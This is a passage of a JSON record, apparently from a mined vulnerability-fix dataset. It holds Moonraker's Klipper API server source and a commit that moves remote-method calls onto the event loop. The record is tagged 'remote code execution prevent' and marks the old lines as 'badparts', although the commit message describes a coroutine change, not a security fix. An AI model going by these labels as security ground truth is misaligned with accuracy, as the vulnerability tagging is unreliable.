self.klippy_connection.connect(self.klippy_address) if not ret: self.ioloop.call_later(.25, self._connect_klippy) return self.ioloop.spawn_callback(self._initialize) def process_command(self, cmd): method=cmd.get('method', None) if method is not None: cb=self.remote_methods.get(method, None) if cb is not None: params=cmd.get('params',{}) cb(**params) else: logging.info(f\"Unknown method received:{method}\") return req_id=cmd.get('id', None) request=self.pending_requests.pop(req_id, None) if request is None: logging.info( f\"No request matching request ID:{req_id}, \" f\"response:{cmd}\") return if 'result' in cmd: result=cmd['result'] if not result: result=\"ok\" else: err=cmd.get('error', \"Malformed Klippy Response\") result=ServerError(err, 400) request.notify(result) def on_connection_closed(self): self.init_list=[] self.klippy_state=\"disconnected\" for request in self.pending_requests.values(): request.notify(ServerError(\"Klippy Disconnected\", 503)) self.pending_requests={} logging.info(\"Klippy Connection Removed\") self.send_event(\"server:klippy_disconnect\") if self.init_handle is not None: self.ioloop.remove_timeout(self.init_handle) if self.server_running: self.ioloop.call_later(.25, self._connect_klippy) async def _initialize(self): if not self.server_running: return await self._check_ready() await self._request_endpoints() if \"webhooks_sub\" not in self.init_list: temp_subs=self.all_subscriptions self.all_subscriptions={} try: await self.klippy_apis.subscribe_objects({'webhooks': None}) except ServerError as e: logging.info(f\"{e}\\nUnable to subscribe to webhooks object\") else: logging.info(\"Webhooks Subscribed\") self.init_list.append(\"webhooks_sub\") self.all_subscriptions.update(temp_subs) if \"gcode_output_sub\" not in self.init_list: try: await self.klippy_apis.subscribe_gcode_output() except ServerError as e: logging.info( f\"{e}\\nUnable to register gcode output subscription\") else: logging.info(\"GCode Output Subscribed\") self.init_list.append(\"gcode_output_sub\") if \"klippy_ready\" in self.init_list or \\ not self.klippy_connection.is_connected(): self.init_attempts=0 self.init_handle=None else: self.init_attempts +=1 self.init_handle=self.ioloop.call_later( INIT_TIME, self._initialize) async def _request_endpoints(self): result=await self.klippy_apis.list_endpoints(default=None) if result is None: return endpoints=result.get('endpoints',{}) for ep in endpoints: self.moonraker_app.register_remote_handler(ep) async def _check_ready(self): send_id=\"identified\" not in self.init_list try: result=await self.klippy_apis.get_klippy_info(send_id) except ServerError as e: if self.init_attempts % LOG_ATTEMPT_INTERVAL==0 and \\ self.init_attempts <=MAX_LOG_ATTEMPTS: logging.info( f\"{e}\\nKlippy info request error. This indicates that\\n\" f\"Klippy may have experienced an error during startup.\\n\" f\"Please check klippy.log for more information\") return if send_id: self.init_list.append(\"identified\") fixed_paths={k: result[k] for k in ['klipper_path', 'python_path', 'log_file', 'config_file']} file_manager=self.lookup_plugin('file_manager') file_manager.update_fixed_paths(fixed_paths) self.klippy_state=result.get('state', \"unknown\") if self.klippy_state==\"ready\": await self._verify_klippy_requirements() logging.info(\"Klippy ready\") self.init_list.append('klippy_ready') for method in self.klippy_reg_methods: try: await self.klippy_apis.register_method(method) except ServerError: logging.exception(f\"Unable to register method '{method}'\") self.send_event(\"server:klippy_ready\") elif self.init_attempts % LOG_ATTEMPT_INTERVAL==0 and \\ self.init_attempts <=MAX_LOG_ATTEMPTS: msg=result.get('state_message', \"Klippy Not Ready\") logging.info(\"\\n\" +msg) async def _verify_klippy_requirements(self): result=await self.klippy_apis.get_object_list(default=None) if result is None: logging.info( f\"Unable to retreive Klipper Object List\") return for name in list(self.all_subscriptions.keys()): if name not in result: del self.all_subscriptions[name] req_objs=set([\"virtual_sdcard\", \"display_status\", \"pause_resume\"]) missing_objs=req_objs -set(result) if missing_objs: err_str=\", \".join([f\"[{o}]\" for o in missing_objs]) logging.info( f\"\\nWarning, unable to detect the following printer \" f\"objects:\\n{err_str}\\nPlease add the the above sections \" f\"to printer.cfg for full Moonraker functionality.\") if \"virtual_sdcard\" not in missing_objs: result=await self.klippy_apis.query_objects( {'configfile': None}, default=None) if result is None: logging.info(f\"Unable to set SD Card path\") else: config=result.get('configfile',{}).get('config',{}) vsd_config=config.get('virtual_sdcard',{}) vsd_path=vsd_config.get('path', None) if vsd_path is not None: file_manager=self.lookup_plugin('file_manager') file_manager.register_directory('gcodes', vsd_path) else: logging.info( \"Configuration for[virtual_sdcard] not found,\" \" unable to set SD Card path\") def _process_gcode_response(self, response): self.send_event(\"server:gcode_response\", response) def _process_status_update(self, eventtime, status): if 'webhooks' in status: state=status['webhooks'].get('state', None) if state is not None: if state==\"shutdown\": logging.info(\"Klippy has shutdown\") self.send_event(\"server:klippy_shutdown\") self.klippy_state=state self.send_event(\"server:status_update\", status) async def make_request(self, rpc_method, params): if rpc_method==\"objects\/subscribe\": for obj, items in params.get('objects',{}).items(): if obj in self.all_subscriptions: pi=self.all_subscriptions[obj] if items is None or pi is None: self.all_subscriptions[obj]=None else: uitems=list(set(pi) | set(items)) self.all_subscriptions[obj]=uitems else: self.all_subscriptions[obj]=items params['objects']=dict(self.all_subscriptions) params['response_template']={'method': \"process_status_update\"} base_request=BaseRequest(rpc_method, params) self.pending_requests[base_request.id]=base_request self.ioloop.spawn_callback( self.klippy_connection.send_request, base_request) result=await base_request.wait() return result async def _stop_server(self): self.server_running=False for name, plugin in self.plugins.items(): if hasattr(plugin, \"close\"): ret=plugin.close() if asyncio.iscoroutine(ret): await ret self.klippy_connection.close() while self.klippy_state !=\"disconnected\": await gen.sleep(.1) await self.moonraker_app.close() self.ioloop.stop() async def _handle_server_restart(self, path, method, args): self.ioloop.spawn_callback(self._stop_server) return \"ok\" async def _handle_info_request(self, path, method, args): return{ 'klippy_connected': self.klippy_connection.is_connected(), 'klippy_state': self.klippy_state, 'plugins': list(self.plugins.keys())} class KlippyConnection: def __init__(self, on_recd, on_close): self.ioloop=IOLoop.current() self.iostream=None self.on_recd=on_recd self.on_close=on_close async def connect(self, address): ksock=socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) kstream=iostream.IOStream(ksock) try: await kstream.connect(address) except iostream.StreamClosedError: return False logging.info(\"Klippy Connection Established\") self.iostream=kstream self.iostream.set_close_callback(self.on_close) self.ioloop.spawn_callback(self._read_stream, self.iostream) return True async def _read_stream(self, stream): while not stream.closed(): try: data=await stream.read_until(b'\\x03') except iostream.StreamClosedError as e: return except Exception: logging.exception(\"Klippy Stream Read Error\") continue try: decoded_cmd=json.loads(data[:-1]) self.on_recd(decoded_cmd) except Exception: logging.exception( f\"Error processing Klippy Host Response:{data.decode()}\") async def send_request(self, request): if self.iostream is None: request.notify(ServerError(\"Klippy Host not connected\", 503)) return data=json.dumps(request.to_dict()).encode() +b\"\\x03\" try: await self.iostream.write(data) except iostream.StreamClosedError: request.notify(ServerError(\"Klippy Host not connected\", 503)) def is_connected(self): return self.iostream is not None and not self.iostream.closed() def close(self): if self.iostream is not None and \\ not self.iostream.closed(): self.iostream.close() class BaseRequest: def __init__(self, rpc_method, params): self.id=id(self) self.rpc_method=rpc_method self.params=params self._event=Event() self.response=None async def wait(self): start_time=time.time() while True: timeout=time.time() +60. try: await self._event.wait(timeout=timeout) except TimeoutError: pending_time=time.time() -start_time logging.info( f\"Request '{self.rpc_method}' pending: \" f\"{pending_time:.2f} seconds\") self._event.clear() continue break if isinstance(self.response, ServerError): raise self.response return self.response def notify(self, response): self.response=response self._event.set() def to_dict(self): return{'id': self.id, 'method': self.rpc_method, 'params': self.params} def main(): parser=argparse.ArgumentParser( description=\"Moonraker -Klipper API Server\") parser.add_argument( \"-c\", \"--configfile\", default=\"~\/moonraker.conf\", metavar='<configfile>', help=\"Location of moonraker configuration file\") parser.add_argument( \"-l\", \"--logfile\", default=\"\/tmp\/moonraker.log\", metavar='<logfile>', help=\"log file name and location\") cmd_line_args=parser.parse_args() log_file=os.path.normpath(os.path.expanduser(cmd_line_args.logfile)) cmd_line_args.logfile=log_file ql=utils.setup_logging(log_file) if sys.version_info <(3, 7): msg=f\"Moonraker requires Python 3.7 or above. \" \\ f\"Detected Version:{sys.version}\" logging.info(msg) print(msg) ql.stop() exit(1) io_loop=IOLoop.current() estatus=0 while True: try: server=Server(cmd_line_args) except Exception: logging.exception(\"Moonraker Error\") estatus=1 break try: server.start() io_loop.start() except Exception: logging.exception(\"Server Running Error\") estatus=1 break time.sleep(.5) logging.info(\"Attempting Server Restart...\") io_loop.close(True) logging.info(\"Server Shutdown\") ql.stop() exit(estatus) if __name__=='__main__': main() ","sourceWithComments":"# Moonraker - HTTP\/Websocket API Server for Klipper\n#\n# Copyright (C) 2020 Eric Callahan <arksine.code@gmail.com>\n#\n# This file may be distributed under the terms of the GNU GPLv3 license\nimport argparse\nimport sys\nimport importlib\nimport os\nimport time\nimport socket\nimport logging\nimport json\nimport confighelper\nimport utils\nimport asyncio\nfrom tornado import iostream, gen\nfrom tornado.ioloop import IOLoop\nfrom tornado.util import TimeoutError\nfrom tornado.locks import Event\nfrom app import MoonrakerApp\nfrom utils import ServerError\n\nINIT_TIME = .25\nLOG_ATTEMPT_INTERVAL = int(2. \/ INIT_TIME + .5)\nMAX_LOG_ATTEMPTS = 10 * LOG_ATTEMPT_INTERVAL\n\nCORE_PLUGINS = [\n    'file_manager', 'klippy_apis', 'machine',\n    'data_store', 'shell_command']\n\nclass Sentinel:\n    pass\n\nclass Server:\n    error = ServerError\n    def __init__(self, args):\n        config = confighelper.get_configuration(self, args)\n        self.host = config.get('host', \"0.0.0.0\")\n        self.port = config.getint('port', 7125)\n\n        # Event initialization\n        self.events = {}\n\n        # Klippy Connection Handling\n        self.klippy_address = config.get(\n            'klippy_uds_address', \"\/tmp\/klippy_uds\")\n        self.klippy_connection = KlippyConnection(\n            self.process_command, self.on_connection_closed)\n        self.init_list = []\n        self.init_handle = None\n        self.init_attempts = 0\n        self.klippy_state = \"disconnected\"\n\n        # XXX - currently moonraker maintains a superset of all\n        # subscriptions, the results of which are forwarded to all\n        # connected websockets. A better implementation would open a\n        # unique unix domain socket for each websocket client and\n        # allow Klipper to forward only those subscriptions back to\n        # correct client.\n        self.all_subscriptions = {}\n\n        # Server\/IOLoop\n        self.server_running = False\n        self.moonraker_app = app = MoonrakerApp(config)\n        self.register_endpoint = app.register_local_handler\n        self.register_static_file_handler = app.register_static_file_handler\n        self.register_upload_handler = app.register_upload_handler\n        self.ioloop = IOLoop.current()\n\n        self.register_endpoint(\n            \"\/server\/info\", ['GET'], self._handle_info_request)\n        self.register_endpoint(\n            \"\/server\/restart\", ['POST'], self._handle_server_restart)\n\n        # Setup remote methods accessable to Klippy.  Note that all\n        # registered remote methods should be of the notification type,\n        # they do not return a response to Klippy after execution\n        self.pending_requests = {}\n        self.remote_methods = {}\n        self.klippy_reg_methods = []\n        self.register_remote_method(\n            'process_gcode_response', self._process_gcode_response,\n            need_klippy_reg=False)\n        self.register_remote_method(\n            'process_status_update', self._process_status_update,\n            need_klippy_reg=False)\n\n        # Plugin initialization\n        self.plugins = {}\n        self.klippy_apis = self.load_plugin(config, 'klippy_apis')\n        self._load_plugins(config)\n\n    def start(self):\n        hostname, hostport = self.get_host_info()\n        logging.info(\n            f\"Starting Moonraker on ({self.host}, {hostport}), \"\n            f\"Hostname: {hostname}\")\n        self.moonraker_app.listen(self.host, self.port)\n        self.server_running = True\n        self.ioloop.spawn_callback(self._connect_klippy)\n\n    # ***** Plugin Management *****\n    def _load_plugins(self, config):\n        # load core plugins\n        for plugin in CORE_PLUGINS:\n            self.load_plugin(config, plugin)\n\n        # check for optional plugins\n        opt_sections = set(config.sections()) - \\\n            set(['server', 'authorization', 'cmd_args'])\n        for section in opt_sections:\n            self.load_plugin(config, section, None)\n\n    def load_plugin(self, config, plugin_name, default=Sentinel):\n        if plugin_name in self.plugins:\n            return self.plugins[plugin_name]\n        # Make sure plugin exists\n        mod_path = os.path.join(\n            os.path.dirname(__file__), 'plugins', plugin_name + '.py')\n        if not os.path.exists(mod_path):\n            msg = f\"Plugin ({plugin_name}) does not exist\"\n            logging.info(msg)\n            if default == Sentinel:\n                raise ServerError(msg)\n            return default\n        module = importlib.import_module(\"plugins.\" + plugin_name)\n        try:\n            if plugin_name not in CORE_PLUGINS:\n                config = config[plugin_name]\n            load_func = getattr(module, \"load_plugin\")\n            plugin = load_func(config)\n        except Exception:\n            msg = f\"Unable to load plugin ({plugin_name})\"\n            logging.exception(msg)\n            if default == Sentinel:\n                raise ServerError(msg)\n            return default\n        self.plugins[plugin_name] = plugin\n        logging.info(f\"Plugin ({plugin_name}) loaded\")\n        return plugin\n\n    def lookup_plugin(self, plugin_name, default=Sentinel):\n        plugin = self.plugins.get(plugin_name, default)\n        if plugin == Sentinel:\n            raise ServerError(f\"Plugin ({plugin_name}) not found\")\n        return plugin\n\n    def register_event_handler(self, event, callback):\n        self.events.setdefault(event, []).append(callback)\n\n    def send_event(self, event, *args):\n        events = self.events.get(event, [])\n        for evt in events:\n            self.ioloop.spawn_callback(evt, *args)\n\n    def register_remote_method(self, method_name, cb, need_klippy_reg=True):\n        if method_name in self.remote_methods:\n            # XXX - may want to raise an exception here\n            logging.info(f\"Remote method ({method_name}) already registered\")\n            return\n        self.remote_methods[method_name] = cb\n        if need_klippy_reg:\n            # These methods need to be registered with Klippy\n            self.klippy_reg_methods.append(method_name)\n\n    def get_host_info(self):\n        hostname = socket.gethostname()\n        return hostname, self.port\n\n    # ***** Klippy Connection *****\n    async def _connect_klippy(self):\n        if not self.server_running:\n            return\n        ret = await self.klippy_connection.connect(self.klippy_address)\n        if not ret:\n            self.ioloop.call_later(.25, self._connect_klippy)\n            return\n        # begin server iniialization\n        self.ioloop.spawn_callback(self._initialize)\n\n    def process_command(self, cmd):\n        method = cmd.get('method', None)\n        if method is not None:\n            # This is a remote method called from klippy\n            cb = self.remote_methods.get(method, None)\n            if cb is not None:\n                params = cmd.get('params', {})\n                cb(**params)\n            else:\n                logging.info(f\"Unknown method received: {method}\")\n            return\n        # This is a response to a request, process\n        req_id = cmd.get('id', None)\n        request = self.pending_requests.pop(req_id, None)\n        if request is None:\n            logging.info(\n                f\"No request matching request ID: {req_id}, \"\n                f\"response: {cmd}\")\n            return\n        if 'result' in cmd:\n            result = cmd['result']\n            if not result:\n                result = \"ok\"\n        else:\n            err = cmd.get('error', \"Malformed Klippy Response\")\n            result = ServerError(err, 400)\n        request.notify(result)\n\n    def on_connection_closed(self):\n        self.init_list = []\n        self.klippy_state = \"disconnected\"\n        for request in self.pending_requests.values():\n            request.notify(ServerError(\"Klippy Disconnected\", 503))\n        self.pending_requests = {}\n        logging.info(\"Klippy Connection Removed\")\n        self.send_event(\"server:klippy_disconnect\")\n        if self.init_handle is not None:\n            self.ioloop.remove_timeout(self.init_handle)\n        if self.server_running:\n            self.ioloop.call_later(.25, self._connect_klippy)\n\n    async def _initialize(self):\n        if not self.server_running:\n            return\n        await self._check_ready()\n        await self._request_endpoints()\n        # Subscribe to \"webhooks\"\n        # Register \"webhooks\" subscription\n        if \"webhooks_sub\" not in self.init_list:\n            temp_subs = self.all_subscriptions\n            self.all_subscriptions = {}\n            try:\n                await self.klippy_apis.subscribe_objects({'webhooks': None})\n            except ServerError as e:\n                logging.info(f\"{e}\\nUnable to subscribe to webhooks object\")\n            else:\n                logging.info(\"Webhooks Subscribed\")\n                self.init_list.append(\"webhooks_sub\")\n            self.all_subscriptions.update(temp_subs)\n        # Subscribe to Gcode Output\n        if \"gcode_output_sub\" not in self.init_list:\n            try:\n                await self.klippy_apis.subscribe_gcode_output()\n            except ServerError as e:\n                logging.info(\n                    f\"{e}\\nUnable to register gcode output subscription\")\n            else:\n                logging.info(\"GCode Output Subscribed\")\n                self.init_list.append(\"gcode_output_sub\")\n        if \"klippy_ready\" in self.init_list or \\\n                not self.klippy_connection.is_connected():\n            # Either Klippy is ready or the connection dropped\n            # during initialization.  Exit initialization\n            self.init_attempts = 0\n            self.init_handle = None\n        else:\n            self.init_attempts += 1\n            self.init_handle = self.ioloop.call_later(\n                INIT_TIME, self._initialize)\n\n    async def _request_endpoints(self):\n        result = await self.klippy_apis.list_endpoints(default=None)\n        if result is None:\n            return\n        endpoints = result.get('endpoints', {})\n        for ep in endpoints:\n            self.moonraker_app.register_remote_handler(ep)\n\n    async def _check_ready(self):\n        send_id = \"identified\" not in self.init_list\n        try:\n            result = await self.klippy_apis.get_klippy_info(send_id)\n        except ServerError as e:\n            if self.init_attempts % LOG_ATTEMPT_INTERVAL == 0 and \\\n                    self.init_attempts <= MAX_LOG_ATTEMPTS:\n                logging.info(\n                    f\"{e}\\nKlippy info request error.  This indicates that\\n\"\n                    f\"Klippy may have experienced an error during startup.\\n\"\n                    f\"Please check klippy.log for more information\")\n            return\n        if send_id:\n            self.init_list.append(\"identified\")\n        # Update filemanager fixed paths\n        fixed_paths = {k: result[k] for k in\n                       ['klipper_path', 'python_path',\n                        'log_file', 'config_file']}\n        file_manager = self.lookup_plugin('file_manager')\n        file_manager.update_fixed_paths(fixed_paths)\n        self.klippy_state = result.get('state', \"unknown\")\n        if self.klippy_state == \"ready\":\n            await self._verify_klippy_requirements()\n            logging.info(\"Klippy ready\")\n            self.init_list.append('klippy_ready')\n            # register methods with klippy\n            for method in self.klippy_reg_methods:\n                try:\n                    await self.klippy_apis.register_method(method)\n                except ServerError:\n                    logging.exception(f\"Unable to register method '{method}'\")\n            self.send_event(\"server:klippy_ready\")\n        elif self.init_attempts % LOG_ATTEMPT_INTERVAL == 0 and \\\n                self.init_attempts <= MAX_LOG_ATTEMPTS:\n            msg = result.get('state_message', \"Klippy Not Ready\")\n            logging.info(\"\\n\" + msg)\n\n    async def _verify_klippy_requirements(self):\n        result = await self.klippy_apis.get_object_list(default=None)\n        if result is None:\n            logging.info(\n                f\"Unable to retreive Klipper Object List\")\n            return\n        # Remove stale objects from the persistent subscription dict\n        for name in list(self.all_subscriptions.keys()):\n            if name not in result:\n                del self.all_subscriptions[name]\n        req_objs = set([\"virtual_sdcard\", \"display_status\", \"pause_resume\"])\n        missing_objs = req_objs - set(result)\n        if missing_objs:\n            err_str = \", \".join([f\"[{o}]\" for o in missing_objs])\n            logging.info(\n                f\"\\nWarning, unable to detect the following printer \"\n                f\"objects:\\n{err_str}\\nPlease add the the above sections \"\n                f\"to printer.cfg for full Moonraker functionality.\")\n        if \"virtual_sdcard\" not in missing_objs:\n            # Update the gcode path\n            result = await self.klippy_apis.query_objects(\n                {'configfile': None}, default=None)\n            if result is None:\n                logging.info(f\"Unable to set SD Card path\")\n            else:\n                config = result.get('configfile', {}).get('config', {})\n                vsd_config = config.get('virtual_sdcard', {})\n                vsd_path = vsd_config.get('path', None)\n                if vsd_path is not None:\n                    file_manager = self.lookup_plugin('file_manager')\n                    file_manager.register_directory('gcodes', vsd_path)\n                else:\n                    logging.info(\n                        \"Configuration for [virtual_sdcard] not found,\"\n                        \" unable to set SD Card path\")\n\n    def _process_gcode_response(self, response):\n        self.send_event(\"server:gcode_response\", response)\n\n    def _process_status_update(self, eventtime, status):\n        if 'webhooks' in status:\n            # XXX - process other states (startup, ready, error, etc)?\n            state = status['webhooks'].get('state', None)\n            if state is not None:\n                if state == \"shutdown\":\n                    logging.info(\"Klippy has shutdown\")\n                    self.send_event(\"server:klippy_shutdown\")\n                self.klippy_state = state\n        self.send_event(\"server:status_update\", status)\n\n    async def make_request(self, rpc_method, params):\n        # XXX - This adds the \"response_template\" to a subscription\n        # request and tracks all subscriptions so that each\n        # client gets what its requesting.  In the future we should\n        # track subscriptions per client and send clients only\n        # the data they are asking for.\n        if rpc_method == \"objects\/subscribe\":\n            for obj, items in params.get('objects', {}).items():\n                if obj in self.all_subscriptions:\n                    pi = self.all_subscriptions[obj]\n                    if items is None or pi is None:\n                        self.all_subscriptions[obj] = None\n                    else:\n                        uitems = list(set(pi) | set(items))\n                        self.all_subscriptions[obj] = uitems\n                else:\n                    self.all_subscriptions[obj] = items\n            params['objects'] = dict(self.all_subscriptions)\n            params['response_template'] = {'method': \"process_status_update\"}\n\n        base_request = BaseRequest(rpc_method, params)\n        self.pending_requests[base_request.id] = base_request\n        self.ioloop.spawn_callback(\n            self.klippy_connection.send_request, base_request)\n        result = await base_request.wait()\n        return result\n\n    async def _stop_server(self):\n        self.server_running = False\n        for name, plugin in self.plugins.items():\n            if hasattr(plugin, \"close\"):\n                ret = plugin.close()\n                if asyncio.iscoroutine(ret):\n                    await ret\n        self.klippy_connection.close()\n        while self.klippy_state != \"disconnected\":\n            await gen.sleep(.1)\n        await self.moonraker_app.close()\n        self.ioloop.stop()\n\n    async def _handle_server_restart(self, path, method, args):\n        self.ioloop.spawn_callback(self._stop_server)\n        return \"ok\"\n\n    async def _handle_info_request(self, path, method, args):\n        return {\n            'klippy_connected': self.klippy_connection.is_connected(),\n            'klippy_state': self.klippy_state,\n            'plugins': list(self.plugins.keys())}\n\nclass KlippyConnection:\n    def __init__(self, on_recd, on_close):\n        self.ioloop = IOLoop.current()\n        self.iostream = None\n        self.on_recd = on_recd\n        self.on_close = on_close\n\n    async def connect(self, address):\n        ksock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n        kstream = iostream.IOStream(ksock)\n        try:\n            await kstream.connect(address)\n        except iostream.StreamClosedError:\n            return False\n        logging.info(\"Klippy Connection Established\")\n        self.iostream = kstream\n        self.iostream.set_close_callback(self.on_close)\n        self.ioloop.spawn_callback(self._read_stream, self.iostream)\n        return True\n\n    async def _read_stream(self, stream):\n        while not stream.closed():\n            try:\n                data = await stream.read_until(b'\\x03')\n            except iostream.StreamClosedError as e:\n                return\n            except Exception:\n                logging.exception(\"Klippy Stream Read Error\")\n                continue\n            try:\n                decoded_cmd = json.loads(data[:-1])\n                self.on_recd(decoded_cmd)\n            except Exception:\n                logging.exception(\n                    f\"Error processing Klippy Host Response: {data.decode()}\")\n\n    async def send_request(self, request):\n        if self.iostream is None:\n            request.notify(ServerError(\"Klippy Host not connected\", 503))\n            return\n        data = json.dumps(request.to_dict()).encode() + b\"\\x03\"\n        try:\n            await self.iostream.write(data)\n        except iostream.StreamClosedError:\n            request.notify(ServerError(\"Klippy Host not connected\", 503))\n\n    def is_connected(self):\n        return self.iostream is not None and not self.iostream.closed()\n\n    def close(self):\n        if self.iostream is not None and \\\n                not self.iostream.closed():\n            self.iostream.close()\n\n# Basic WebRequest class, easily converted to dict for json encoding\nclass BaseRequest:\n    def __init__(self, rpc_method, params):\n        self.id = id(self)\n        self.rpc_method = rpc_method\n        self.params = params\n        self._event = Event()\n        self.response = None\n\n    async def wait(self):\n        # Log pending requests every 60 seconds\n        start_time = time.time()\n        while True:\n            timeout = time.time() + 60.\n            try:\n                await self._event.wait(timeout=timeout)\n            except TimeoutError:\n                pending_time = time.time() - start_time\n                logging.info(\n                    f\"Request '{self.rpc_method}' pending: \"\n                    f\"{pending_time:.2f} seconds\")\n                self._event.clear()\n                continue\n            break\n        if isinstance(self.response, ServerError):\n            raise self.response\n        return self.response\n\n    def notify(self, response):\n        self.response = response\n        self._event.set()\n\n    def to_dict(self):\n        return {'id': self.id, 'method': self.rpc_method,\n                'params': self.params}\n\ndef main():\n    # Parse start arguments\n    parser = argparse.ArgumentParser(\n        description=\"Moonraker - Klipper API Server\")\n    parser.add_argument(\n        \"-c\", \"--configfile\", default=\"~\/moonraker.conf\",\n        metavar='<configfile>',\n        help=\"Location of moonraker configuration file\")\n    parser.add_argument(\n        \"-l\", \"--logfile\", default=\"\/tmp\/moonraker.log\", metavar='<logfile>',\n        help=\"log file name and location\")\n    cmd_line_args = parser.parse_args()\n\n    # Setup Logging\n    log_file = os.path.normpath(os.path.expanduser(cmd_line_args.logfile))\n    cmd_line_args.logfile = log_file\n    ql = utils.setup_logging(log_file)\n\n    if sys.version_info < (3, 7):\n        msg = f\"Moonraker requires Python 3.7 or above.  \" \\\n            f\"Detected Version: {sys.version}\"\n        logging.info(msg)\n        print(msg)\n        ql.stop()\n        exit(1)\n\n    # Start IOLoop and Server\n    io_loop = IOLoop.current()\n    estatus = 0\n    while True:\n        try:\n            server = Server(cmd_line_args)\n        except Exception:\n            logging.exception(\"Moonraker Error\")\n            estatus = 1\n            break\n        try:\n            server.start()\n            io_loop.start()\n        except Exception:\n            logging.exception(\"Server Running Error\")\n            estatus = 1\n            break\n        # Since we are running outside of the the server\n        # it is ok to use a blocking sleep here\n        time.sleep(.5)\n        logging.info(\"Attempting Server Restart...\")\n    io_loop.close(True)\n    logging.info(\"Server Shutdown\")\n    ql.stop()\n    exit(estatus)\n\n\nif __name__ == '__main__':\n    main()\n"}},"msg":"moonraker:  spawn remote methods on the event loop\n\nThis allows regsitered methods to be coroutines.  Execution is done on the event loop to prevent a coroutine from blocking the incoming command queue.\n\nSigned-off-by:  Eric Callahan <arksine.code@gmail.com>"}},"https:\/\/github.com\/DmitriyAD\/moonraker":{"6dfab37ef856fade2839dd0315db4f2d25284947":{"url":"https:\/\/api.github.com\/repos\/DmitriyAD\/moonraker\/commits\/6dfab37ef856fade2839dd0315db4f2d25284947","html_url":"https:\/\/github.com\/DmitriyAD\/moonraker\/commit\/6dfab37ef856fade2839dd0315db4f2d25284947","message":"moonraker:  spawn remote methods on the event loop\n\nThis allows regsitered methods to be coroutines.  Execution is done on the event loop to prevent a coroutine from blocking the incoming command queue.\n\nSigned-off-by:  Eric Callahan <arksine.code@gmail.com>","sha":"6dfab37ef856fade2839dd0315db4f2d25284947","keyword":"remote code execution prevent","diff":"diff --git a\/moonraker\/moonraker.py b\/moonraker\/moonraker.py\nindex e438602..7e0a9ed 100644\n--- a\/moonraker\/moonraker.py\n+++ b\/moonraker\/moonraker.py\n@@ -183,10 +183,10 @@ def process_command(self, cmd):\n         method = cmd.get('method', None)\n         if method is not None:\n             # This is a remote method called from klippy\n-            cb = self.remote_methods.get(method, None)\n-            if cb is not None:\n+            if method in self.remote_methods:\n                 params = cmd.get('params', {})\n-                cb(**params)\n+                self.ioloop.spawn_callback(\n+                    self._execute_method, method, **params)\n             else:\n                 logging.info(f\"Unknown method received: {method}\")\n             return\n@@ -207,6 +207,14 @@ def process_command(self, cmd):\n             result = ServerError(err, 400)\n         request.notify(result)\n \n+    async def _execute_method(self, method_name, **kwargs):\n+        try:\n+            ret = self.remote_methods[method_name](**kwargs)\n+            if asyncio.iscoroutine(ret):\n+                await ret\n+        except Exception:\n+            logging.exception(f\"Error running remote method: {method_name}\")\n+\n     def on_connection_closed(self):\n         self.init_list = []\n         self.klippy_state = \"disconnected\"\n","files":{"\/moonraker\/moonraker.py":{"changes":[{"diff":"\n         method = cmd.get('method', None)\n         if method is not None:\n             # This is a remote method called from klippy\n-            cb = self.remote_methods.get(method, None)\n-            if cb is not None:\n+            if method in self.remote_methods:\n                 params = cmd.get('params', {})\n-                cb(**params)\n+                self.ioloop.spawn_callback(\n+                    self._execute_method, method, **params)\n             else:\n                 logging.info(f\"Unknown method received: {method}\")\n             return\n","add":3,"remove":3,"filename":"\/moonraker\/moonraker.py","badparts":["            cb = self.remote_methods.get(method, None)","            if cb is not None:","                cb(**params)"],"goodparts":["            if method in self.remote_methods:","                self.ioloop.spawn_callback(","                    self._execute_method, method, **params)"]},{"diff":"\n         method = cmd.get('method', None)\n         if method is not None:\n             # This is a remote method called from klippy\n-            cb = self.remote_methods.get(method, None)\n-            if cb is not None:\n+            if method in self.remote_methods:\n                 params = cmd.get('params', {})\n-                cb(**params)\n+                self.ioloop.spawn_callback(\n+                    self._execute_method, method, **params)\n             else:\n                 logging.info(f\"Unknown method received: {method}\")\n             return\n","add":3,"remove":3,"filename":"\/moonraker\/moonraker.py","badparts":["            cb = self.remote_methods.get(method, None)","            if cb is not None:","                cb(**params)"],"goodparts":["            if method in self.remote_methods:","                self.ioloop.spawn_callback(","                    self._execute_method, method, **params)"]}],"source":"\n import argparse import sys import importlib import os import time import socket import logging import json import confighelper import utils import asyncio from tornado import iostream, gen from tornado.ioloop import IOLoop from tornado.util import TimeoutError from tornado.locks import Event from app import MoonrakerApp from utils import ServerError INIT_TIME=.25 LOG_ATTEMPT_INTERVAL=int(2. \/ INIT_TIME +.5) MAX_LOG_ATTEMPTS=10 * LOG_ATTEMPT_INTERVAL CORE_PLUGINS=[ 'file_manager', 'klippy_apis', 'machine', 'data_store', 'shell_command'] class Sentinel: pass class Server: error=ServerError def __init__(self, args): config=confighelper.get_configuration(self, args) self.host=config.get('host', \"0.0.0.0\") self.port=config.getint('port', 7125) self.events={} self.klippy_address=config.get( 'klippy_uds_address', \"\/tmp\/klippy_uds\") self.klippy_connection=KlippyConnection( self.process_command, self.on_connection_closed) self.init_list=[] self.init_handle=None self.init_attempts=0 self.klippy_state=\"disconnected\" self.all_subscriptions={} self.server_running=False self.moonraker_app=app=MoonrakerApp(config) self.register_endpoint=app.register_local_handler self.register_static_file_handler=app.register_static_file_handler self.register_upload_handler=app.register_upload_handler self.ioloop=IOLoop.current() self.register_endpoint( \"\/server\/info\",['GET'], self._handle_info_request) self.register_endpoint( \"\/server\/restart\",['POST'], self._handle_server_restart) self.pending_requests={} self.remote_methods={} self.klippy_reg_methods=[] self.register_remote_method( 'process_gcode_response', self._process_gcode_response, need_klippy_reg=False) self.register_remote_method( 'process_status_update', self._process_status_update, need_klippy_reg=False) self.plugins={} self.klippy_apis=self.load_plugin(config, 'klippy_apis') self._load_plugins(config) def start(self): hostname, hostport=self.get_host_info() logging.info( f\"Starting Moonraker on({self.host},{hostport}), \" f\"Hostname:{hostname}\") self.moonraker_app.listen(self.host, self.port) self.server_running=True self.ioloop.spawn_callback(self._connect_klippy) def _load_plugins(self, config): for plugin in CORE_PLUGINS: self.load_plugin(config, plugin) opt_sections=set(config.sections()) -\\ set(['server', 'authorization', 'cmd_args']) for section in opt_sections: self.load_plugin(config, section, None) def load_plugin(self, config, plugin_name, default=Sentinel): if plugin_name in self.plugins: return self.plugins[plugin_name] mod_path=os.path.join( os.path.dirname(__file__), 'plugins', plugin_name +'.py') if not os.path.exists(mod_path): msg=f\"Plugin({plugin_name}) does not exist\" logging.info(msg) if default==Sentinel: 